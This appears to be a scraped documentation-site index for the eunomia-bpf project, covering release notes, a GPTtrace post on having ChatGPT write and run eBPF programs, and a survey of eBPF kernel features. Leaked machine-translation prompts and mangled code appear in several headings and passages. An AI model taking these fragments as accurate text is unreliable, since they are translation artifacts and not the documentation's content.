Improved compilation experience, formatting changes\n\n1. Completely refactored the compilation toolchain and configuration file format, returning to the essence of a configuration file + ebpf bytecode .o format. It no longer requires the packaging to be in JSON format, making it more user-friendly for distribution and human editing of configuration files. It also improves compatibility with libbpf-related toolchains.\".2. Support both JSON and YAML formats for configuration files (xxx.skel.yaml and xxx.skel.json), or package them as package.json and package.yaml for distribution;\n3. Use BTF information to express symbol types as much as possible, and hide BTF information in binary files to make configuration files more readable and editable, while reusing the BTF handling mechanism provided by libbpf to improve type handling;\n4. Support more data export types: enum, struct, bool, etc.\n5. Compilation can be done without relying on docker. The binaries and header files can be installed in ~/.eunomia (more friendly to embedded or domestic networks, more convenient to use). The original way of using docker can still be continued;\n6. There is no specific restriction on the file name. It does not have to be xxx.bpf.h and xxx.bpf.c. The files to be compiled in the current directory can be specified through ecc;\n7. Rename the old xxx.bpf.h header file in the example to xxx.h, to be consistent with libbpf-tools and libbpf-bootstrap, and ensure that the libbpf-related code ecosystem can be reused with 0 code modifications;\n8. Greatly optimize compilation speed and reduce compilation dependencies by refactoring the compilation toolchain with Rust, replacing the original Python script.\n\nIn the configuration file, you can directly modify progs/attach to control the mounting point, variables/value to control global variables, maps/data to control the data to be placed in the map when loading the ebpf program, and export_types/members to control the data format to be transmitted to the user space, without the need to recompile the eBPF program. The configuration file and bpf.o binary are complementary and should be used together, or packaged as a package.json/yaml for distribution. When packaging, compression will be applied, and generally the combined size of the compressed configuration file and binary is several tens of kilobytes.\n\nConfiguration file example:\n\n```yaml\nbpf_skel:\n  data_sections:\n  - name: .rodata\n    variables:\n    - name: min_duration_ns\n      type: unsigned long long\n      value: 100\n  maps:\n  - ident: exec_start\n    name: exec_start\n    data:\n      - key: 123\n        value: 456\n  - ident: rb\n    name: rb\n  - ident: rodata\n    mmaped: true\n    name: client_b.rodata\n  obj_name: client_bpf\n  progs:\n  - attach: tp/sched/sched_process_exec\n    link: true\n    name: handle_exec\nexport_types:\n- members:\n  - name: pid\n    type: int\n  - name: ppid\n    type: int\n  - name: comm\n    type: char[16]\n  - name: filename\n    type: char[127]\n  - name: exit_event\n    type: bool\n  name: event\n  type_id: 613\n</code></pre>","text":""},{"location":"blogs/0_3_0-release/#download-and-install-eunomia-bpf","title":"Download and install eunomia-bpf","text":"<ul> <li> <p>Install the <code>ecli</code> tool for running eBPF programs from the cloud:</p> <pre><code>$ wget https://aka.pw/bpf-ecli -O ecli &amp;&amp; chmod +x ./ecli\n$ ./ecli -h\nUsage: ecli [--help] [--version] [--json] [--no-cache] url-and-args\n....\n</code></pre> </li> <li> <p>Install the compiler-toolchain for compiling eBPF kernel code to a <code>config</code> file or <code>Wasm</code> module:</p> <p>```console $ wget https://github.com/eunomia-bpf/eunomia-bpf/releases/latest/download/ecc &amp;&amp; chmod +x ./ecc $ ./ecc -h eunomia-bpf compiler\"Usage: ecc [OPTIONS]  [EXPORT_EVENT_HEADER] .... .... <p>```</p> <p>or use the docker image for compile:</p> <pre><code>docker run -it -v `pwd`/:/src/ ghcr.io/eunomia-bpf/ecc-`uname -m`:latest # compile with docker. `pwd` should contains *.bpf.c files and *.h files.\n</code></pre>"},{"location":"blogs/0_3_0-release/#development-plans","title":"Development Plans","text":"<ol> <li>Collaborate with more community partners and gradually establish a standardized eBPF program format that is packaged and distributed using configuration files or Wasm binary. Achieve the goal of compiling once and running everywhere.</li> <li>Work with the LMP community to improve the distribution and runtime standards for eBPF programs based on ORAS, OCI, and Wasm. Enable any eBPF application to be easily pulled from the cloud and run with a single command or seamlessly embedded in other applications, without concerning the architecture and kernel version.</li> <li>Collaborate with the Coolbpf community to enhance remote compilation, support for lower versions, and add support for RPC in the libbpf library.</li> <li>Improve interoperability between user-mode Wasm and eBPF programs, and explore relevant extensions of WASI.</li> </ol>"},{"location":"blogs/0_3_0-release/#references","title":"References","text":"<ol> <li>Writing, Distributing, Loading, and Running eBPF Programs using WebAssembly</li> <li>How to start eBPF journey in the Linux Microscope (LMP) project?</li> <li>Eunomia-BPF Project Homepage on Longgui Community</li> <li>Eunomia-BPF Project Documentation</li> <li>LMP Project</li> </ol>"},{"location":"blogs/0_3_0-release/#our-wechat-group","title":"Our WeChat Group.","text":"<p>Share on  Share on </p>"},{"location":"blogs/1_0-release/","title":"Introducing eunomia-bpf v1.0: Simplifying eBPF with CO-RE and WebAssembly","text":"<p>The world of eBPF (Extended Berkeley Packet Filter) has been rapidly evolving, offering developers powerful tools to monitor and modify the behavior of systems at the kernel level. Today, we're thrilled to introduce the latest milestone in this journey - eunomia-bpf v1.0. This release is a testament to our commitment to simplifying and enhancing the eBPF development experience with CO-RE (Compile Once, Run Everywhere) and WebAssembly.</p>"},{"location":"blogs/1_0-release/#introduction","title":"Introduction","text":"<p>eunomia-bpf is not just another tool in the eBPF ecosystem. It's a dynamic loading library/runtime and a compile toolchain framework designed with a singular vision - to make building and distributing eBPF programs easier and more efficient.</p> <p>With the rise of cloud-native applications and the need for fine-grained system monitoring, eBPF has become an indispensable tool for developers. However, the complexities associated with writing, compiling, and distributing eBPF programs have often been a barrier. This is where eunomia-bpf steps in, offering a suite of tools and features that streamline the entire process.</p>"},{"location":"blogs/1_0-release/#whats-new-in-eunomia-bpf-v10","title":"What's New in eunomia-bpf v1.0","text":"<p>The eunomia-bpf v1.0 release marks a significant milestone in our journey to simplify and enhance the eBPF development experience. Here's a deep dive into the new features and enhancements that cater to both novice and experienced eBPF developers:</p> <ul> <li>Expanded Architectural Support:</li> <li><code>aarch64</code> Compatibility: Recognizing the growing adoption of ARM-based systems, we've expanded our support to include the <code>aarch64</code> architecture. Whether you're on <code>x86_64</code> or <code>aarch64</code>, expect a consistent eunomia-bpf experience.</li> <li> <p>Cross-Compilation: Our commitment to <code>aarch64</code> goes beyond mere compatibility. Given our build servers are x86_64-based, we've employed cross-compilation techniques to produce <code>aarch64</code> executable files and docker images. For the tech-savvy, our build scripts and workflow files are readily available in our repository.</p> </li> <li> <p>Reduced External Dependencies with AppImage:</p> </li> <li>Self-Contained Binaries: Our precompiled binaries for <code>ecc</code> and <code>ecli</code> are now packaged as AppImages. This means all required dependency libraries are bundled within, eliminating pesky version conflicts, especially with libraries like <code>glibc</code> and <code>libclang</code>.</li> <li> <p>Universal Compatibility: Thanks to static linking with <code>libfuse</code>, the released <code>ecli</code> and <code>ecc</code> AppImages can run seamlessly across distributions, independent of the locally provided <code>glibc</code>. All you need is kernel support for fuse. For those interested, our repository houses the workflow files detailing the AppImage construction with all dependencies.</p> </li> <li> <p>Diverse Attachment Types:</p> </li> <li>Broadened eBPF Program Support: Version <code>1.0</code> introduces support for a variety of eBPF program types, including:<ul> <li>tc: Monitor traffic control with precision.</li> <li>xdp: Keep an eye on XDP-related packets.</li> <li>profile: Gain insights into the kernel stack and user stack activities on specific processor cores.</li> </ul> </li> <li> <p>Hands-on Learning: To help developers get started, we offer tests and examples tailored for each of these attachment types.</p> </li> <li> <p>Revamped OCI in ecli:</p> </li> <li>Modular and Efficient: The OCI component of ecli has been meticulously refactored, leading to a more modular and efficient design.</li> <li> <p>Introducing <code>ecli-server</code>: With the new <code>ecli-server</code>, developers can harness the power of OpenAPI to run ecli programs on their local machines remotely. Whether you're using the OpenAPI interface to run and fetch logs or executing programs remotely via <code>ecli</code>, the experience is as intuitive as local runs.</p> </li> <li> <p>bpf-compatible Evolution:</p> </li> <li>Enhanced Cross-Kernel Execution: Building on our legacy of supporting cross-kernel version execution without local BTF dependencies, v1.0 takes it a step further.</li> <li>A Dedicated Project: We've carved out this functionality into a standalone project, bpf-compatible. This project focuses on leveraging btfhub to trim BTF files across different distributions and kernel versions. The trimmed files are then embedded into the executable, ready to be accessed via specific APIs.</li> </ul>"},{"location":"blogs/1_0-release/#core-features-of-eunomia-bpf","title":"Core Features of eunomia-bpf","text":"<p>eunomia-bpf v1.0 is more than just a set of new features. It's a culmination of our vision to provide a comprehensive framework for eBPF development:</p> <ul> <li> <p>Simplified eBPF Program Writing: With eunomia-bpf, developers can focus solely on writing the kernel code. The framework takes care of data exposure, command-line argument generation, and more.</p> </li> <li> <p>Building eBPF with Wasm: Our integration with WebAssembly opens up new avenues for eBPF development. Whether you're working in C/C++, Rust, Go, or other languages, eunomia-bpf has got you covered.</p> </li> <li> <p>Distributing eBPF Programs with Ease: Our tools for pushing, pulling, and running pre-compiled eBPF programs as OCI images in Wasm modules simplify the distribution process. Plus, with support for dynamic loading through JSON or Wasm modules, deployment is a breeze.</p> </li> </ul>"},{"location":"blogs/1_0-release/#getting-started-with-eunomia-bpf","title":"Getting Started with eunomia-bpf","text":"<p>Ready to dive in? Here are some resources to kickstart your journey with eunomia-bpf:</p> <ul> <li> <p>Github Template: Explore our template at eunomia-bpf/ebpf-template for a hands-on introduction.</p> </li> <li> <p>Example BPF Programs: Delve into real-world applications with our example programs.</p> </li> <li> <p>Tutorials: For a deeper understanding, check out our comprehensive developer tutorial.</p> </li> </ul>"},{"location":"blogs/1_0-release/#conclusion","title":"Conclusion","text":"<p>eunomia-bpf v1.0 is more than just a release; it's a promise. A promise to continually simplify and enhance the eBPF development experience. As the eBPF landscape evolves, so will eunomia-bpf, ensuring that developers always have the best tools at their disposal.</p> <p>For more insights and detailed documentation, head over to https://github.com/eunomia-bpf/eunomia-bpf</p> <p>Share on  Share on </p>"},{"location":"blogs/GPTtrace/","title":"Using ChatGPT to Write eBPF Programs and Trace Linux Systems with Natural Language","text":"<p>eBPF is a revolutionary technology that originated in the Linux kernel and allows sandboxed programs to run in the kernel of an operating system. It is used to securely and efficiently extend the functionality of the kernel without changing its source code or loading kernel modules. Today, eBPF is widely used in various scenarios: in modern data centers and cloud-native environments, it can provide high-performance network packet processing and load balancing; with very low resource overhead, it enables observability of various fine-grained metrics, helping application developers trace applications and gain insights for performance troubleshooting; it ensures secure execution of applications and container runtimes, and more. eBPF has become an increasingly popular technology that helps us to efficiently trace and analyze almost all applications in the kernel and user space.</p> <p>However, developing eBPF programs or tracing various events generated by the kernel requires certain expertise. For developers unfamiliar with this technology, it can be challenging. In this case, the new ideas brought by our demo tool, GPTtrace, might help you solve this problem. It uses ChatGPT to write eBPF programs and trace the Linux kernel with natural language: https://github.com/eunomia-bpf/GPTtrace</p> <p>If you are a developer who wants to trace and analyze more efficiently, similar solutions are definitely worth trying. The combination of ChatGPT and eBPF technology will play a more important role in future software development, debugging, and observability scenarios, and it may also bring a new interactive learning paradigm.</p>"},{"location":"blogs/GPTtrace/#what-have-we-tried","title":"What Have We Tried?","text":"<p>GPTtrace uses ChatGPT technology to allow developers to write eBPF programs and trace the Linux kernel in natural language, without the need for prior expertise in this technology. It enables developers to locate and solve software issues more quickly and accurately. For example, to count Page Faults based on process names:</p> <p></p> <p>We also have a video demonstration and explanation which can be viewed here: https://www.bilibili.com/video/BV1oM411J7gp/</p>"},{"location":"blogs/GPTtrace/#how-did-we-achieve-this","title":"How Did We Achieve This?","text":"<p>Our current approach is to pretrain eBPF programs by having conversations with ChatGPT using various eBPF development materials, teaching ChatGPT how to write different eBPF programs or bpftrace DSL based on the context of the conversation (in fact, we did some similar practice in December and produced a tutorial document, but we didn't turn it into a tool: https://github.com/eunomia-bpf/bpf-developer-tutorial). Here's the rough breakdown:</p> <ol> <li>Pretrain eBPF programs by having conversations with ChatGPT using eBPF development materials to teach ChatGPT how to write different eBPF programs or bpftrace DSL.</li> <li>Call the ChatGPT API and parse the returned result to execute it as a command in the shell or write the eBPF program to a file for compilation and execution.</li> <li>If there are compilation and loading errors, return the corresponding error messages to ChatGPT to generate a new eBPF program or command.</li> </ol> <p>We used the ChatGPT Python API and spent an afternoon implementing this little toy. It can accept natural language descriptions in various languages such as Chinese or English, for example, \"trace open files in a process\" or \"show per-second syscall rates\". The accuracy is not 100%, but out of ten attempts, roughly seven or eight should result in successful tracing. In case of errors, the tool can make corrections and adjustments on its own.</p>"},{"location":"blogs/GPTtrace/#further-improvements","title":"Further Improvements?","text":"<p>This toy project is intended to demonstrate the possibilities, and there should soon be better APIs like ChatGPT and more general training/execution frameworks available. Hopefully, it will serve as a catalyst for further development. Currently, it seems that there is still plenty of room for improvement:</p> <ol> <li>After enabling internet access, the tool could learn from the example programs in the bcc/bpftrace repository, which would greatly improve its effectiveness.</li> <li>Alternatively, the application itself could search Stack Overflow or similar platforms to query how to write eBPF programs, similar to the new search feature in Bing.</li> <li>Provide more high-quality documentation and tutorials, as the accuracy of the output is closely related to the quality of the tutorials and code examples.</li> <li>It is also possible to invoke other tools multiple times to execute commands, for example, using ChatGPT to output a command, querying the current kernel version and supported tracepoints using bpftrace, and returning the output (this is another conversation), followed by providing a program. This should yield much better results.Short-term, we hope to try building an interactive, informative kernel tracing tool and an eBPF program learning tutorial based on this tool. This will help users quickly understand the syntax and debug errors when writing eBPF programs, and adjust the quality of prompts and suggestions based on user feedback. We also aim to provide a structured tutorial for learning eBPF programming, starting from basic syntax and APIs, and gradually introducing common eBPF application scenarios and writing techniques based on the requirements of the final eBPF program the user wants to write.</li> </ol> <p>In a sense, it might not even be just a language model. With the interactive mode of simple conversations and the ability to manipulate various tools and access the internet, it might serve as a huge and unprecedented knowledge base: connecting various professions, providing comprehensive summaries and thoughts that cannot be easily obtained through search engines based on natural language inputs.</p> <p>In the era of information explosion, we can easily access massive amounts of information, but this also brings another problem, which is the dispersion and fragmentation of information, making it difficult to integrate this information into valuable knowledge. However, ChatGPT can integrate various information and knowledge through natural language interactions, even actively acquire knowledge and receive feedback (just like we did in GPTtrace), forming a huge knowledge base that provides comprehensive thoughts and answers to people.</p> <p>This approach can connect various professions without being limited to specific fields or industries, and provide more accurate and comprehensive summaries based on natural language inputs. Additionally, since ChatGPT can manipulate various tools and access the internet, it can have a deeper understanding of various knowledge and information, and provide users with more comprehensive and in-depth answers.</p> <p>This revolutionary change may already be on the eve of a transformation in human civilization. The way we acquire knowledge and thoughts will be disrupted, and the emergence of similar large-scale models will be an important driving force behind this transformation.</p>"},{"location":"blogs/GPTtrace/#what-does-the-future-hold","title":"What does the future hold?","text":"<p>In fact, the performance of this model itself is not amazing, and there is still a lot of room for improvement. For someone like me who is not an AI professional researcher (a consumer of AI tools and models), compared to the traditional way of training deep learning models:</p> <ul> <li>Training models do not require organizing and cleaning datasets, only a few high-quality documents and tutorials are needed, in very small quantities, described in natural language; greatly reducing the preparation work for non-professionals.</li> <li>Training can be done intuitively and conveniently with just the conversation context, and anyone can easily understand (or try to analogize) how AI learns.</li> <li>It can adapt to many different tasks in various fields, as long as any task can be converted into a piece of text or command.</li> </ul> <p>As Mr. Che Wanxiang from Harbin Institute of Technology mentioned in the Qingyuan Workshop, in the ChatGPT era, the dangers and opportunities for NLPers are as follows:</p> <p>In the era of ChatGPT, to cope with current challenges, researchers in the field of natural language can learn from information retrieval researchers' experiences. Firstly, academia may no longer conduct systematic research, but mainly focus on relatively marginal research directions; secondly, experiments using data provided by industrial giants may not necessarily yield reliable conclusions, as there are doubts about the authenticity of data due to privacy concerns; conducting research by calling APIs provided by companies may lead to changes in conclusions once the model is adjusted.</p> <p>When the threshold for using AI to solve specific problems becomes low enough, it becomes an enormous opportunity for AI to further popularize and solve problems in more specific scenarios. On the other hand, it may also be the support for AI's infrastructure: when the cost of generating content (such as code, text, algorithms, audio, and video) becomes cheaper, programmable and low-code platforms may become more scalable and reusable compared to the previous huge monolithic applications. For example, directly generating a FaaS interface from a description or interactive dialogue, directly generating a web front-end and deploying it, or using the code generated by ChatGPT as an observable collection and data processing program, deployed to a large-scale observability platform.</p> <p>We are also exploring some compilation toolchains and runtimes that combine eBPF and Wasm, with the aim of achieving programmable extensions from kernel space to user space: https://github.com/eunomia-bpf/wasm-bpf</p>"},{"location":"blogs/GPTtrace/#some-reference-links","title":"Some reference links","text":"<ul> <li>ChatGPT: https://chat.openai.com/chat</li> <li>GPTtrace: https://github.com/eunomia-bpf/GPTtrace</li> <li>ChatGPT Python API: https://github.com/mmabrouk/chatgpt-wrapper</li> <li>eBPF Developer Tutorial Based on CO-RE (Write Once, Run Everywhere) libbpf: Learn eBPF step by step through 20 small tools (trying to teach ChatGPT to write eBPF programs): https://github.com/eunomia-bpf/bpf-developer-tutorial</li> <li>How ChatGPT-like tools achieve \"strikes\" | A summary of discussions on closed-door seminars on chatbots: https://mp.weixin.qq.com/s/fB9rguy26ej-alm7l_i8iQ</li> <li>eunomia-bpf Open Source Community: https://github.com/eunomia-bpf</li> </ul> <p>Note: This article was written with the help of ChatGPT.</p> <p>Share on  Share on </p>"},{"location":"blogs/bpf-news/","title":"eBPF Advanced: Overview of New Kernel Features","text":"<p>The Linux kernel primarily released versions 5.16-5.19, 6.0, and 6.1 in 2022, each of which introduced numerous new features for eBPF. This article will provide a brief introduction to these new features, and for more detailed information, please refer to the corresponding link. Overall, eBPF remains one of the most active modules in the kernel, and its functionality is still rapidly evolving. In a sense, eBPF is rapidly evolving towards a complete kernel-level programmable interface.</p> <ul> <li>eBPF Advanced: Overview of New Kernel Features</li> <li>BPF kfuncs</li> <li>Bloom Filter Map: 5.16</li> <li>Compile Once \u2013 Run Everywhere: Linux 5.17\".Linux 5.17 added a new feature called Compile Once - Run Everywhere (CO-RE) for eBPF, which greatly simplifies the complexity of handling multi-version kernel compatibility and loop logic in eBPF programs</li> <li>Helper function bpf_loop(): 5.17</li> <li>BPF_LINK_TYPE_KPROBE_MULTI: 5.18</li> <li>Dynamic Pointers and Type Pointers: 5.19.Instructions: Translate the following Chinese text to English</li> <li>USDT: 5.19</li> <li>BPF panic: 6.1</li> <li>BPF Memory Allocator, Linked List: 6.1</li> <li>User Ring Buffer 6.1</li> </ul>"},{"location":"blogs/bpf-news/#bpf-kfuncs","title":"BPF kfuncs","text":"<p>The BPF subsystem exposes many aspects of kernel internal algorithms and data structures, which naturally leads to concerns about maintaining interface stability when the kernel changes. For a long time, BPF's stance on not providing interface stability guarantees to user space has been somewhat problematic. In the past, kernel developers found themselves having to maintain interfaces that were not intended to be stable. Now the BPF community is starting to consider what it might mean to provide explicit stability guarantees for at least some of its interfaces.</p> <p>BPF allows programs loaded from user space to be attached to any of a large number of hooks and run in the kernel\u2014after the subsystem's verifier has concluded that those programs won't harm the system. A program gains access to kernel data structures provided by the hook to which it is attached. In some cases, a program can modify those data structures directly, thereby directly affecting the kernel's operation. In other cases, the kernel will take action based on values returned by a BPF program, such as allowing or disallowing a particular operation.</p> <p>There are also two mechanisms by which the kernel can provide BPF programs with additional functionality. Helper functions have been around since the extended BPF era and are special functions written to be made available to BPF programs. A mechanism called kfuncs is relatively new and allows any kernel function to be made available to BPF, potentially with some restrictions. Kfuncs are simpler and more flexible, and if they were implemented first, it seems unlikely that anyone would have added helpers later. That said, kfuncs have an important limitation in that they can only be accessed by JIT-compiled BPF code, so they are not available on architectures lacking JIT support (which currently includes 32-bit Arm and RISC-V, although patches adding support for these are in development). Each kfunc provides some useful functionality to BPF programs but also exposes some aspects of how the kernel works.</p> <ul> <li>Reconsidering BPF ABI stability: Link</li> <li>Documentation/bpf: Add a description of \"stable kfuncs\" Link</li> </ul>"},{"location":"blogs/bpf-news/#bloom-filter-map-516","title":"Bloom Filter Map: 5.16","text":"<p>Bloom filters are space-efficient probabilistic data structures used to quickly test whether an element is a member of a set. In a bloom filter, false positives are possible, but false negatives are not.</p> <p>This patchset includes benchmarking of bloom filters with configurable numbers of hash values and entries. These benchmarks roughly indicate that, on average, using 3 hash functions is one of the ideal choices. When comparing the bloom filter with 3 hash values used in hashmap lookups to hashmap lookups without bloom filters, the lookup with the bloom filter is approximately 15% faster for 50,000 entries, 25% faster for 100,000 entries, 180% faster for 500,000 entries, and 200% faster for 1 million entries.</p> <ul> <li>BPF: Implement bloom filter map Link</li> </ul>"},{"location":"blogs/bpf-news/#compile-once-run-everywhere-linux-517linux-517-added-a-new-feature-called-compile-once-run-everywhere-co-re-for-ebpf-which-greatly-simplifies-the-complexity-of-handling-multi-version-kernel-compatibility-and-loop-logic-in-ebpf-programs","title":"Compile Once \u2013 Run Everywhere: Linux 5.17\".Linux 5.17 added a new feature called Compile Once - Run Everywhere (CO-RE) for eBPF, which greatly simplifies the complexity of handling multi-version kernel compatibility and loop logic in eBPF programs","text":"<p>The CO-RE project of eBPF relies on the debugging information provided by BPF Type Format (BTF) and goes through the following four steps to enable eBPF programs to adapt to different versions of the kernel:</p> <ul> <li>First, the bpftool provides a tool to generate header files from BTF, eliminating the need for kernel header files.</li> <li>Second, by rewriting the access offsets in the BPF code, the problem of different data structure offsets in different kernel versions is resolved.</li> <li>Third, the modifications of data structures in different kernel versions are pre-defined in libbpf to address the issue of incompatible data structures in different kernels.</li> <li>Fourth, libbpf provides a series of library functions for detecting kernel features, solving the problem of eBPF programs needing to perform different behaviors in different kernel versions. For example, you can use bpf_core_type_exists() and bpf_core_field_exists() to check if kernel data types and member variables exist, and use the format extern int LINUX_KERNEL_VERSION __kconfig to query kernel configuration options.</li> </ul> <p>With these methods, CO-RE allows eBPF programs to be compiled in the development environment and distributed to machines with different kernel versions, without the need to install various development tools and kernel header files on the target machines. Therefore, the Linux kernel community recommends that all developers use CO-RE and libbpf to build eBPF programs. In fact, if you have looked at the source code of BCC, you will find that BCC has already migrated many tools to CO-RE.</p> <ul> <li>Detailed explanation of eBPF multi-kernel version compatibility: https://time.geekbang.org/column/article/534577</li> <li>BPF CO-RE reference guide: https://nakryiko.com/posts/bpf-core-reference-guide/</li> </ul>"},{"location":"blogs/bpf-news/#helper-function-bpf_loop-517","title":"Helper function bpf_loop(): 5.17","text":"<p>One of the main features of the extended BPF virtual machine is the built-in validator in the kernel, which ensures that all BPF programs can run safely. However, BPF developers often have mixed feelings about the validator; although it can catch many problems before they occur, it is also difficult to satisfy. Comparing it to a well-meaning but rule-constrained and picky bureaucratic organization is not entirely wrong. The bpf_loop() proposal by Joanne Koong is intended to make a type of loop structure more pleasing to the BPF bureaucrats.</p> <p>In short, that is the purpose of Koong's patch. It adds a new helper function that can be called from BPF code.</p> <pre><code>    long bpf_loop(u32 iterations, long (*loop_fn)(u32 index, void *ctx),\n          void *ctx, u64 flags);\n</code></pre> <p>A call to bpf_loop() will result in iterative calls to loop_fn(), with the iteration count and the passed ctx as parameters. The flags value is currently unused and must be zero. loop_fn() typically returns 0; returning 1 will immediately end the iteration. No other return values are allowed.</p> <p>Unlike bpf_for_each_map_elem(), which is limited by BPF map size, the number of iterations for bpf_loop() can be as high as 1&lt;&lt;23 = 8388608 (over 8 million); greatly expanding the range of applications for bpf_loop(). However, bpf_loop() is not limited by the number of BPF instructions (1 million) because the loop occurs inside the bpf_loop() helper function.</p> <ul> <li>A different approach to BPF loops: https://lwn.net/Articles/877062/</li> <li>eBPF Talk: Practical experience with loops: https://mp.weixin.qq.com/s/neOVsMNVWFbwpTSek-_YsA</li> </ul>"},{"location":"blogs/bpf-news/#bpf_link_type_kprobe_multi-518","title":"BPF_LINK_TYPE_KPROBE_MULTI: 5.18","text":"<p>This patch set adds a new link type called BPF_TRACE_KPROBE_MULTI, which connects kprobe programs using the fprobe API [1] created by Masami. The fprobe API allows probes to be attached to multiple functions at once and works very fast because it operates on top of ftrace. On the other hand, it restricts the probe points to function entry or return.</p> <ul> <li>bpf: Add kprobe multi link: https://lwn.net/Articles/885811/</li> </ul>"},{"location":"blogs/bpf-news/#dynamic-pointers-and-type-pointers-519instructions-translate-the-following-chinese-text-to-english","title":"Dynamic Pointers and Type Pointers: 5.19.Instructions: Translate the following Chinese text to English","text":"<p>while maintaining the original formatting: \"All memory accesses in the BPF program use validators for security static checks, and validators perform comprehensive analysis of the program before allowing it to run. While this enables BPF programs to run safely in kernel space, it restricts how the program can use pointers. Until recently, one such restriction was that the size of the memory region referenced by a pointer in a BPF program had to be statically known when loading the BPF program. Joanne Koong recently introduced a patchset that enhances BPF to support loading programs with pointers to dynamically sized memory regions.</p> <p>Koong's patchset adds support for accessing dynamically sized memory regions in BPF programs, which includes a new feature called dynptrs. The main idea behind dynptrs is to associate pointers to dynamically sized data regions with validators and some metadata used by BPF helper functions, to ensure that access to that region is valid. Koong's patchset creates this association in a newly defined type called struct bpf_dynptr. This structure is opaque to BPF programs.</p> <ul> <li>https://mp.weixin.qq.com/s/rz4pd41Y-Cet5YVSAKmCRw</li> </ul>"},{"location":"blogs/bpf-news/#usdt-519","title":"USDT: 5.19","text":"<p>Static tracepoints, also known as User-Level Statically Defined Tracing (USDT) probes, are specific locations of interest in an application that a tracer can mount to check code execution and data. They are explicitly defined by developers in the source code and are usually enabled at compile time with flags such as \"--enable-trace\". The advantage of static tracepoints is that they do not change frequently: developers typically maintain a stable static trace ABI, so tracing tools work across different versions of an application, which is useful, for example, when upgrading a PostgreSQL installation and experiencing performance degradation.</p> <ul> <li>eBPF Overview Part 5: Tracing User Processes: https://www.ebpf.top/post/ebpf-overview-part-5/</li> <li>Using user-space tracepoints with BPF: https://lwn.net/Articles/753601/</li> </ul>"},{"location":"blogs/bpf-news/#bpf-panic-61","title":"BPF panic: 6.1","text":"<p>One of the key selling points of the BPF subsystem is that loading BPF programs is safe: the BPF verifier ensures that the program cannot harm the kernel before allowing it to load. As more features are offered to BPF programs, this guarantee may lose some of its strength, but even so, seeing Artem Savkov's proposal to introduce a BPF helper explicitly designed to crash the system may come as a bit of a surprise. If merged in a form resembling the current patchset, it would be a harbinger of a new era in which, at least in certain cases, BPF programs are allowed to deliberately cause havoc.</p> <p>As Savkov points out, one of the primary use cases for BPF is kernel debugging, and this task is often helped by having a timely crash dump available. By making the panic() function of the kernel available to BPF programs, Savkov attempts to combine these two and allow BPF programs to crash and create crash dumps when certain conditions indicating the problems that developers are looking for are detected. Savkov seems not to be the only one who wants this ability; Jiri Olsa has reported receiving requests for such functionality as well.</p> <ul> <li>The BPF panic function: https://lwn.net/Articles/901284/</li> </ul>"},{"location":"blogs/bpf-news/#bpf-memory-allocator-linked-list-61","title":"BPF Memory Allocator, Linked List: 6.1","text":"<p>This series introduces BPF objects defined by users in the BTF type of the program. This allows BPF programs to allocate their own objects, build their own object hierarchy, and flexibly construct their own data structures using the basic building blocks provided by the BPF runtime.</p> <p>Then, we introduce support for singly-owned BPF linked lists. They can be placed in BPF maps or allocated objects and hold these allocated objects as elements. It works as an intrusive set. The aim of doing this is to make the allocated objects part of multiple data structures in the future.</p> <p>The ultimate goal of this patch and future patches is to allow people to do some limited kernel-style programming in BPF C and allow programmers to flexibly construct their own complex data structures from basic building blocks.</p> <p>The key difference is that these programs are verified, safe, preserve runtime integrity of the system, and have been proven to have no bugs.</p> <p>Specific features include:</p> <ul> <li>Allocating objects</li> <li>bpf_obj_new, bpf_obj_drop to allocate and release objects</li> <li>Singly-owned BPF linked lists</li> <li>Supporting them in BPF maps</li> <li>Supporting them in allocated objects</li> <li>Global spinlocks</li> <li>Spinlocks in allocated objects.</li> </ul> <p>Reference: https://lwn.net/Articles/914833/</p>"},{"location":"blogs/bpf-news/#user-ring-buffer-61","title":"User Ring Buffer 6.1","text":"<p>This patchset defines a new map type, BPF_MAP_TYPE_USER_RINGBUF, which provides single-user space producer/single-kernel consumer semantics on top of a ring buffer. In addition to the new map type, it adds an auxiliary function called bpf_user_ringbuf_drain() that allows a BPF program to specify a callback with the following signature, to which the samples are published by the helper function.</p> <p><code>c\". format: Return only the translated content, not including the original text.</code> void (struct bpf_dynptr dynptr, void context).</p> <p>Then the program can safely read samples from dynptr using the bpf_dynptr_read() or bpf_dynptr_data() helper functions. Currently, there are no available helper functions to determine the size of the samples, but one can easily be added if needed.</p> <p>libbpf has also added some corresponding APIs:</p> <pre><code>struct ring_buffer_user *\nring_buffer_user__new(int map_fd,\n                      const struct ring_buffer_user_opts *opts);\nvoid ring_buffer_user__free(struct ring_buffer_user *rb);\nvoid *ring_buffer_user__reserve(struct ring_buffer_user *rb,\n        uint32_t size);\nvoid *ring_buffer_user__poll(struct ring_buffer_user *rb, uint32_t size,\n           int timeout_ms);\nvoid ring_buffer_user__discard(struct ring_buffer_user *rb, void *sample);\nvoid ring_buffer_user__submit(struct ring_buffer_user *rb, void *sample);\n</code></pre> <ul> <li>bpf: Add user-space-publisher ring buffer map type: https://lwn.net/Articles/907056/</li> </ul> <ul> <li>This article was completed by the eunomia-bpf team and we are exploring the toolchains and runtimes integrating eBPF and WebAssembly: https://github.com/eunomia-bpf/wasm-bpf</li> <li>And trying to build some interesting use cases on top of Wasm and eBPF.</li> </ul> <p>Share on  Share on </p>"},{"location":"blogs/bpftime/","title":"bpftime: Extending eBPF from Kernel to User Space","text":"<p>Yu Sheng Zheng, Yu Tong</p> <p>eBPF is a revolutionary technology that originated in the Linux kernel, enabling sandboxed programs to run within the operating system's kernel. It is used to safely and efficiently extend the kernel's capabilities without altering its source code or loading kernel modules.</p> <p>In this blog, we are excited to introduce a new open-source user-space eBPF runtime: https://github.com/eunomia-bpf/bpftime. bpftime further expands the capabilities of eBPF, allowing existing eBPF tools and applications, such as BCC tools, bpftrace, Deepflow, etc., to run in non-privileged user space without any code modifications, while using the same libraries and toolchains as kernel eBPF.</p> <p>bpftime not only provides dynamic tracing or extension mechanisms like Uprobe and system call tracepoints, but also offers an order of magnitude performance improvement over kernel Uprobe. Moreover, like kernel eBPF, it requires no manual code instrumentation or process restarts. bpftime supports inter-process eBPF maps through user-space shared memory, while being compatible with kernel eBPF maps, enabling seamless operations with kernel eBPF infrastructure. Additionally, it includes high-performance LLVM JIT/AOT compilers for various architectures, as well as a lightweight JIT and interpreter for x86. Through performance data and real-world examples, we will demonstrate how bpftime can be effective in the real world and provide insights into its future development. We hope bpftime will bring unprecedented performance and flexibility to system monitoring, analysis, and extension. We also introduced the design and implementation of bpftime at the Linux plumbers 23 conference[2].</p>"},{"location":"blogs/bpftime/#ebpf-system-extension-from-kernel-to-user-space","title":"eBPF: System Extension from Kernel to 